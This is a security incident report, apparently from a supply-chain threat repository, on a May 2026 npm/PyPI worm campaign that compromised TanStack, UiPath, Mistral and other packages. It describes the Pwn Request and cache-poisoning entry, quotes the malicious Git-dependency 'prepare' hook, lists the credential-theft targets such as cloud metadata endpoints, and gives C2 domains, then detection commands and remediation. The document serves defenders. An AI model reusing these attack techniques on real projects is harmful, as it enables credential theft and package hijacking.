# Mini Shai-Hulud Wave 3 — TanStack + Multi-Namespace npm Worm (TeamPCP)

**Date:** May 2026
**Ecosystem:** npm / PyPI
**Severity:** Critical
**Type:** Pwn Request / CI/CD OIDC token theft / Trusted publishing abuse / Supply chain worm
**Sources:**
- [Aikido Security — Mini Shai-Hulud Is Back: npm Worm Hits over 160 Packages, including Mistral and Tanstack](https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised)
- [StepSecurity — TeamPCP's Mini Shai-Hulud Is Back: A Self-Spreading Supply Chain Attack Compromises TanStack npm Packages](https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem)
- [Semgrep — TanStack Router Packages Hit by Mini Shai-Hulud TheBeautifulSandsOfTime Supply Chain Attack](https://semgrep.dev/blog/2026/tanstack-router-packages-hit-by-coordinated-supply-chain-attack)
- [Wiz — Mini Shai-Hulud Strikes Again: TanStack + more npm Packages Compromised](https://www.wiz.io/blog/mini-shai-hulud-strikes-again-tanstack-more-npm-packages-compromised)

---

## Summary

On May 11, 2026, TeamPCP launched its largest Mini Shai-Hulud wave to date — a coordinated supply chain attack that ultimately compromised 373 malicious package-version entries across 169 npm package names, plus two PyPI packages. Primary targets included `@tanstack/react-router` (~12 million weekly downloads), the complete `@uipath` automation toolchain, and packages across the `@squawk`, `@mistralai`, `@tallyui`, `@beproduct`, `@draftlab`, `@draftauth`, `@taskflow-corp`, `@tolka`, and `@ml-toolkit-ts` namespaces.

The TanStack entry vector was a `pull_request_target` Pwn Request combined with GitHub Actions cache poisoning and OIDC token extraction from runner process memory — confirmed by TanStack's own post-mortem and credited to StepSecurity for discovery. Compromised TanStack packages bundle a new payload delivery mechanism: a root-level `router_init.js` file plus an optional dependency pointing to an attacker-controlled GitHub-hosted package containing a `prepare` hook that runs Bun with the main payload. The UiPath namespace was compromised separately using the familiar `preinstall: node setup.mjs` pattern from the April 2026 SAP wave, with a re-obfuscated payload sharing identical C2 infrastructure.

This wave introduces two significant escalations over prior Shai-Hulud generations: a **Session network exfiltration channel** (decentralized, cryptographically addressed, effectively takedown-resistant) replacing the GitHub private-repo dead-drop used in April, and a **persistent `gh-token-monitor` daemon** that continues harvesting GitHub tokens from the victim's machine long after the initial install. The worm's propagation logic — stealing npm and OIDC tokens, then abusing trusted publishing paths — extended compromise into PyPI (`mistralai`, `guardrails-ai`) and into the `@opensearch-project/opensearch` npm package, demonstrating cross-ecosystem propagation at scale for the first time in this campaign lineage.

---

## Compromised Artifacts

### npm (primary — largest clusters)

| Package | Malicious Version(s) | Notes |
|---------|----------------------|-------|
| `@tanstack/react-router` | 1.169.5, 1.169.8 | ~12M weekly downloads; routing library for React |
| `@tanstack/router-core` | 1.169.5, 1.169.8 | Core router dependency |
| `@tanstack/history` | 1.161.9, 1.161.12 | |
| `@tanstack/router-utils` | 1.161.11, 1.161.14 | |
| `@tanstack/router-plugin` | 1.167.38, 1.167.41 | |
| `@tanstack/router-generator` | 1.166.45, 1.166.48 | |
| `@tanstack/react-start` | 1.167.68, 1.167.71 | Full-stack React framework |
| `@tanstack/solid-router` | 1.169.5, 1.169.8 | |
| `@tanstack/vue-router` | 1.169.5, 1.169.8 | |
| `@tanstack/router-devtools-core` | 1.167.6, 1.167.9 | |
| `@tanstack/eslint-plugin-router` | 1.161.9 | |
| `@mistralai/mistralai` | 2.2.2, 2.2.3, 2.2.4 | Official Mistral AI Node SDK |
| `@mistralai/mistralai-gcp` | 1.7.1, 1.7.2, 1.7.3 | |
| `@mistralai/mistralai-azure` | 1.7.1, 1.7.2, 1.7.3 | |
| `@uipath/apollo-core` | 5.9.2 | UiPath enterprise automation platform |
| `@uipath/apollo-react` | 4.24.5 | |
| `@uipath/robot` | 1.3.4 | |
| `@uipath/cli` | 1.0.1 | |
| `@uipath/agent-sdk` | 1.0.2 | |
| `@uipath/project-packager` | 1.1.16 | |
| `@squawk/types` | 0.8.2–0.8.4 | Aviation tooling (87 entries in @squawk — largest cluster) |
| `@squawk/mcp` | 0.9.1–0.9.4 | |
| `@beproduct/nestjs-auth` | 0.1.2–0.1.19 | 18 versions across 3 weeks |
| `@opensearch-project/opensearch` | (multiple) | Via worm propagation from victim OIDC tokens |
| `safe-action` | 0.8.3, 0.8.4 | Unscoped; popular action-safety library |
| `cross-stitch` | 1.1.3–1.1.6 | |
| `ts-dna` | 3.0.1–3.0.4 | |
| `cmux-agent-mcp` | 0.1.3–0.1.8 | |
| `agentwork-cli` | 0.1.4, 0.1.5 | |
| `git-branch-selector` | 1.3.3–1.3.7 | |

*Full list of 169 package names available via Aikido and StepSecurity OSS Security Feed.*

### PyPI (cross-ecosystem worm propagation)

| Package | Malicious Version(s) |
|---------|----------------------|
| `mistralai` | 2.4.6 |
| `guardrails-ai` | 0.10.1 |

---

## How It Worked

### Entry Point 1: TanStack — Pwn Request + Cache Poisoning + OIDC Extraction

The attacker submitted a crafted `pull_request_target` PR to the TanStack Router repository (Pwn Request pattern). This workflow trigger type runs with elevated permissions in the context of the base branch — including access to GitHub Actions secrets and OIDC tokens. Combined with GitHub Actions cache poisoning (replacing cached dependencies with malicious variants to execute attacker code within the trusted workflow context), the attacker was able to extract OIDC tokens directly from Runner.Worker process memory. These short-lived OIDC tokens were then used to request npm publish tokens and push malicious versions of 42 `@tanstack/*` packages (84 malicious versions total) via the legitimate TanStack GitHub Actions publishing pipeline. TanStack published an official post-mortem confirming this chain.

### Entry Point 2: UiPath — Preinstall Script (SAP Wave Pattern)

UiPath namespace packages were compromised via the same `preinstall: node setup.mjs` mechanism used in the April 2026 SAP wave. `setup.mjs` downloads the Bun v1.3.13 runtime and executes the main payload. The UiPath variant uses a re-obfuscated payload with a different campaign key but identical C2 infrastructure to the TanStack variant — confirming the same threat actor and toolchain.

### Entry Point 3: Self-Propagating Worm

Additional namespaces (`@squawk`, `@beproduct`, `@mistralai`, `@draftlab`, `@draftauth`, `@taskflow-corp`, `@tolka`, `@ml-toolkit-ts`, PyPI packages, `@opensearch-project`) were compromised through the worm's propagation logic: stolen npm and OIDC tokens were used to identify all packages the victim has publish rights to, inject the malicious payload into the package tarball, bump the patch version, and publish the poisoned release.

### TanStack Payload Delivery: Git Dependency Lifecycle Hook Abuse

Compromised TanStack packages include a new obfuscated file at the package root — `router_init.js` — and add an optional dependency pointing to an attacker-controlled GitHub commit:

```json
"optionalDependencies": {
  "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
}
```

That attacker-controlled Git-hosted package contains a `prepare` script:

```json
"scripts": {
  "prepare": "bun run tanstack_runner.js && exit 1"
}
```

npm runs lifecycle scripts for Git-sourced dependencies during installation. Because the dependency is marked `optional`, the `exit 1` causes npm to silently discard the failure — but the Bun payload has already executed. This technique bypasses defences focused on `preinstall`/`postinstall` hooks in the direct package manifest.

### Payload Mechanics

The payload (`tanstack_runner.js`, executed via Bun) is heavily obfuscated across three layers. Key behaviours:

**Runner.Worker memory scraping:** Dumps `/proc/<Runner.Worker PID>/mem` to extract masked GitHub Actions secrets that never appear in environment variables or log files.

**Credential harvesting (100+ paths):**
- GitHub tokens (PATs `ghp_*`, OAuth `gho_*`, Actions OIDC `ghs_*`) via `gh auth token`, environment, and file scan
- npm publish tokens (`npm_*`)
- AWS: IMDSv2 (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`), ECS task metadata (`http://169.254.170.2`), `~/.aws/credentials`, session tokens, SSM, Secrets Manager
- GCP: metadata server, Application Default Credentials
- Azure: storage connection strings, client secrets, Key Vault
- Kubernetes service account tokens (`/var/run/secrets/kubernetes.io/serviceaccount/token`)
- HashiCorp Vault: `vault.svc.cluster.local:8200`, local Vault endpoints
- IDE configs, `.env` files, SSH private keys, MCP server configurations

**Exfiltration via Session network (new in this wave):** Stolen credentials are encrypted and sent to a Session (decentralized messaging protocol) recipient address. Session uses onion routing over a network of seed nodes, making takedown significantly harder than domain-based or GitHub-based channels.

**Persistence — `gh-token-monitor` daemon:** If the payload finds a GitHub token that passes a five-point validity check (valid login, `repo` or `public_repo` scope, public profile, write access to a repository, org membership), it installs a persistent daemon called `gh-token-monitor` that polls GitHub at regular intervals for additional token opportunities. This daemon survives the npm install process and persists across reboots until explicitly removed.

**Worm propagation:** Using stolen npm tokens and OIDC tokens, the worm:
1. Queries the npm registry for all packages the victim can publish
2. Downloads and extracts each package tarball
3. Injects `router_init.js` and the optional `@tanstack/setup` dependency (or `setup.mjs`/`execution.js` for non-TanStack packages)
4. Bumps the patch version
5. Re-packs and publishes to the registry

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| May 11, 2026 | TeamPCP launches coordinated attack; Pwn Request + cache poisoning against TanStack repository; Runner.Worker OIDC token extracted |
| May 11, 2026 | 84 malicious versions across 42 `@tanstack/*` packages published via legitimate GitHub Actions OIDC publishing pipeline |
| May 11, 2026 | `@uipath` namespace compromised in parallel using `preinstall: node setup.mjs` (SAP-wave delivery mechanism) |
| May 11, 2026 | Worm begins propagating; `@squawk`, `@beproduct`, `@mistralai`, `@draftlab`, `@draftauth`, `@taskflow-corp`, `@tolka`, unscoped packages, and PyPI packages compromised via stolen tokens |
| May 11, 2026 | Semgrep and Aikido Security detect and publish initial disclosures |
| May 12, 2026 | StepSecurity, Wiz, and Aikido publish full technical analyses; TanStack publishes official post-mortem crediting StepSecurity |
| May 12, 2026 | `@opensearch-project/opensearch` identified as compromised (cross-org worm propagation) |

---

## Detection

```bash
# ── Check for compromised @tanstack versions ──────────────────────────────────
# Key router packages
npm ls @tanstack/react-router 2>/dev/null | grep -E "1\.169\.(5|8)"
npm ls @tanstack/router-core 2>/dev/null | grep -E "1\.169\.(5|8)"
npm ls @tanstack/router-plugin 2>/dev/null | grep -E "1\.167\.(38|41)"
npm ls @tanstack/react-start 2>/dev/null | grep -E "1\.167\.(68|71)"

# Check package-lock.json for any affected @tanstack versions
grep -E '"@tanstack/[^"]+": "\{?(1\.16[1-9]\.|1\.17[0-9]\.)' package-lock.json

# ── Look for payload files at package roots ───────────────────────────────────
find node_modules -maxdepth 3 -name "router_init.js" 2>/dev/null
find node_modules -maxdepth 3 -name "tanstack_runner.js" 2>/dev/null
find node_modules -maxdepth 3 -name "router_runtime.js" 2>/dev/null
find node_modules -maxdepth 3 -name "setup.mjs" 2>/dev/null | grep -v ".node_modules.\.bin"

# Hash check on known-malicious files
sha256sum node_modules/@tanstack/*/router_init.js 2>/dev/null
# MALICIOUS: ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c
sha256sum node_modules/@tanstack/*/tanstack_runner.js 2>/dev/null
# MALICIOUS: 2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96

# ── Look for the optional dependency marker ───────────────────────────────────
grep -r '"@tanstack/setup"' node_modules/@tanstack/*/package.json 2>/dev/null
grep -r 'github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c' \
  node_modules/ package-lock.json yarn.lock 2>/dev/null

# ── Check for UiPath / other affected namespaces ─────────────────────────────
npm ls @uipath/apollo-core 2>/dev/null | grep "5\.9\.2"
npm ls @mistralai/mistralai 2>/dev/null | grep -E "2\.2\.(2|3|4)"
npm ls @opensearch-project/opensearch 2>/dev/null

# ── PyPI checks ───────────────────────────────────────────────────────────────
pip show mistralai 2>/dev/null | grep "Version: 2\.4\.6"
pip show guardrails-ai 2>/dev/null | grep "Version: 0\.10\.1"

# ── Detect the gh-token-monitor persistence daemon ───────────────────────────
# macOS: check LaunchAgent / LaunchDaemon plists
ls ~/Library/LaunchAgents/ 2>/dev/null | grep -i "gh-token\|tanstack\|shai"
# Linux: check systemd user units and cron
systemctl --user list-units 2>/dev/null | grep -i "gh-token\|tanstack"
crontab -l 2>/dev/null | grep -i "gh-token\|tanstack\|bun"
# Check for the daemon process
ps aux | grep -i "gh-token-monitor"

# ── Check for Session network C2 connections ─────────────────────────────────
# In CI logs or network captures:
# Domains to look for: seed1.getsession.org, seed2.getsession.org,
#                      seed3.getsession.org, filev2.getsession.org
# C2 domain: git-tanstack.com (83.142.209.194)
grep -r "getsession\.org\|git-tanstack\.com\|83\.142\.209\.194" \
  /var/log/ ~/.npm/_logs/ 2>/dev/null

# ── Detect GitHub exfil repos ─────────────────────────────────────────────────
gh repo list --visibility private --json name,description,createdAt --limit 100 2>/dev/null | \
  jq '.[] | select(.description | test("Shai-Hulud"))'

# ── CI log scan for Bun execution during npm install ────────────────────────
grep -r "bun run tanstack_runner\|bun-v1\.3\.13\|prepare.*tanstack_runner" \
  /var/log/ ~/.npm/_logs/ 2>/dev/null

# ── Check AWS CloudTrail for IMDS abuse ──────────────────────────────────────
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --start-time 2026-05-11T00:00:00Z \
  --query 'Events[?contains(CloudTrailEvent, `169.254.169.254`)]'

# ── Audit npm packages for unauthorized publish activity ─────────────────────
# Check for any patch-version bumps on packages you own since May 11:
npm access list packages <your-npm-username>
```

---

## Remediation

1. **Identify exposure:** Run the detection commands above. Check package-lock.json, yarn.lock, and pnpm-lock.yaml for any affected package versions from the affected namespaces.

2. **Remove the `gh-token-monitor` persistence daemon immediately** — before rotating credentials, or the daemon will harvest the new tokens:
   ```bash
   # macOS
   launchctl unload ~/Library/LaunchAgents/gh-token-monitor.plist 2>/dev/null
   rm -f ~/Library/LaunchAgents/gh-token-monitor.plist
   # Linux
   systemctl --user stop gh-token-monitor 2>/dev/null
   systemctl --user disable gh-token-monitor 2>/dev/null
   # Kill any running process
   pkill -f gh-token-monitor
   ```

3. **Rotate all credentials** from every machine or CI runner where an affected package version was installed — treat as full compromise:
   - GitHub PATs (`ghp_*`), OAuth tokens (`gho_*`), and Actions secrets
   - npm publish tokens — revoke at npmjs.com/settings, then audit all packages you own for unauthorized new patch versions published after May 11
   - AWS access keys, session tokens, and IAM roles
   - GCP service account keys and Application Default Credentials
   - Azure client secrets, storage connection strings, Key Vault values
   - Kubernetes service account tokens
   - HashiCorp Vault tokens
   - SSH private keys (`~/.ssh/id_*`)
   - Any `.env` secrets from affected environments

4. **Downgrade to clean versions:**
   ```bash
   # TanStack — use the version just below the compromised range; check TanStack post-mortem for confirmed clean releases
   npm install @tanstack/react-router@1.169.4 @tanstack/router-core@1.169.4 --ignore-scripts
   # Mistral npm SDK
   npm install @mistralai/mistralai@2.2.1 --ignore-scripts
   # PyPI
   pip install "mistralai==2.4.5" "guardrails-ai==0.10.0"
   ```

5. **Audit packages you maintain** for unauthorized versions published since May 11, 2026:
   ```bash
   npm view <your-package> versions --json | tail -20
   ```
   If an unexpected version exists, deprecate it immediately: `npm deprecate <pkg>@<version> "SECURITY: unauthorized release"`

6. **Verify npm provenance attestations** — packages with SLSA attestations that suddenly drop them are a strong compromise signal:
   ```bash
   npm audit signatures @tanstack/react-router
   ```

7. **Adopt `--ignore-scripts` as a standing CI policy:**
   ```bash
   npm ci --ignore-scripts
   ```
   Note: this alone would not have blocked the TanStack variant (which used a Git-dependency `prepare` hook), but it blocks the UiPath/SAP-wave variant.

8. **Block Git-hosted optional dependencies** in CI by auditing `package-lock.json` for any `github:` or `git+https:` resolved entries in packages you did not explicitly add.

---

## Lessons Learned

- **Git-dependency lifecycle hooks are a novel bypass for `--ignore-scripts`:** npm runs `prepare` scripts for Git-hosted dependencies even when `--ignore-scripts` is set for the direct install — attackers can chain a legitimate package → optional Git dependency → `prepare` hook to execute arbitrary code regardless of the `--ignore-scripts` policy
- **Session network exfiltration dramatically raises the operational cost of takedown:** Prior Shai-Hulud waves used GitHub private repos (takedownable) or known domains (blockable). The Session protocol's decentralized onion network has no central point for abuse teams to act on, increasing the dwell time before exfiltrated secrets can be recovered
- **Provenance + OIDC trusted publishing is necessary but not sufficient:** The TanStack packages carried SLSA provenance — but the attacker abused the trusted publishing workflow itself, so provenance attestations were present on the malicious packages. Provenance proves *where* a package was built; it cannot prove the build environment was not compromised
- **`gh-token-monitor` persistence means credential rotation must happen in the right order:** Rotating secrets before removing the persistence daemon is ineffective — the daemon will harvest the new tokens within minutes of rotation
- **Cross-ecosystem propagation (npm → PyPI) is now confirmed at scale:** The worm successfully jumped from npm OIDC tokens to PyPI publishing tokens, compromising Python packages used by AI/ML teams — expanding the attack surface beyond JavaScript ecosystems
- **Pwn Request + cache poisoning is a repeatable, highly reliable OIDC token extraction path:** This two-stage technique has now been used in multiple attacks (see Bitwarden, prt-scan) — any workflow using `pull_request_target` with cached dependencies is a high-priority hardening target

---

## IOCs

| Indicator | Type | Notes |
|-----------|------|-------|
| `@tanstack/setup` optional dep → `github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c` | Git reference | Malicious payload delivery |
| `router_init.js` | Malicious file | Present at root of compromised @tanstack packages |
| `tanstack_runner.js` | Malicious file | Bun payload script (via Git dependency) |
| `router_runtime.js` | Malicious file | Re-obfuscated variant in other namespaces |
| `ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c` | SHA-256 | router_init.js |
| `2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96` | SHA-256 | tanstack_runner.js |
| `2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df` | SHA-256 | setup.mjs / router_runtime.js variant |
| `git-tanstack.com` | C2 domain | Primary exfiltration C2 |
| `83.142.209.194` | C2 IP | Resolves git-tanstack.com |
| `seed1.getsession.org` | Session seed node | Decentralized exfil channel |
| `seed2.getsession.org` | Session seed node | |
| `seed3.getsession.org` | Session seed node | |
| `filev2.getsession.org` | Session file server | |
| `05f9e609d79eed391015e11380dee4b5c9ead0b6e2e7f0134e6e51767a87323026` | Session recipient ID | Attacker's Session address |
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | AWS IMDS endpoint | Cloud credential theft |
| `http://169.254.170.2` | ECS task metadata | Cloud credential theft |
| `vault.svc.cluster.local:8200` | HashiCorp Vault | Vault token theft |
| `gh-token-monitor` | Persistence daemon name | Installed to harvest GitHub tokens |
| `Shai-Hulud: Here We Go Again` | GitHub repo description | Attacker exfil repos created under victim accounts |
| `TheBeautifulSandsOfTime` | Campaign sub-tag | Seen in Semgrep article title; Dune-themed attribution marker |
| `bun run tanstack_runner.js && exit 1` | Prepare script | Lifecycle hook in malicious `@tanstack/setup` Git package |
| `@mistralai/mistralai@2.2.2`, `2.2.3`, `2.2.4` | Malicious npm package | |
| `mistralai@2.4.6` (PyPI) | Malicious PyPI package | Cross-ecosystem propagation |
| `guardrails-ai@0.10.1` (PyPI) | Malicious PyPI package | Cross-ecosystem propagation |

---

## Related Incidents

- [Mini Shai-Hulud Wave — SAP npm + intercom-client (April 2026)](./2026-04-mini-shai-hulud-sap-npm.md) — Immediately prior wave; same Bun v1.3.13 toolchain, same `setup.mjs`/`execution.js` delivery used for UiPath variant in this wave
- [lightning PyPI Compromise — Mini Shai-Hulud in Python Ecosystem (April 2026)](./2026-04-lightning-pypi-shai-hulud.md) — Prior PyPI wave from same campaign; `router_runtime.js` payload lineage
- [Mini Shai-Hulud — Intercom PHP Packagist (April 2026)](./2026-04-intercom-php-packagist.md) — PHP ecosystem extension of the same campaign
- [Fake tanstack npm — .env Exfiltration via Svix Webhook Relay (April 2026)](./2026-04-fake-tanstack-npm.md) — Earlier typosquatting attack targeting the tanstack namespace; separate actor, lower sophistication
- [Bitwarden CLI Shai-Hulud Third Coming (April 2026)](./2026-04-bitwarden-cli-shai-hulud.md) — Same TeamPCP C2; CI/CD pipeline compromise vector
- [prt-scan — AI-Augmented GitHub Actions Credential Theft Campaign (April 2026)](./2026-04-prt-scan-github-actions.md) — Earlier `pull_request_target` exploitation used for CI secret theft; same attack primitive as TanStack entry vector
- [CanisterWorm — TeamPCP npm Worm (March 2026)](./2026-03-canisterworm-npm.md) — Campaign origin; self-propagating worm lineage
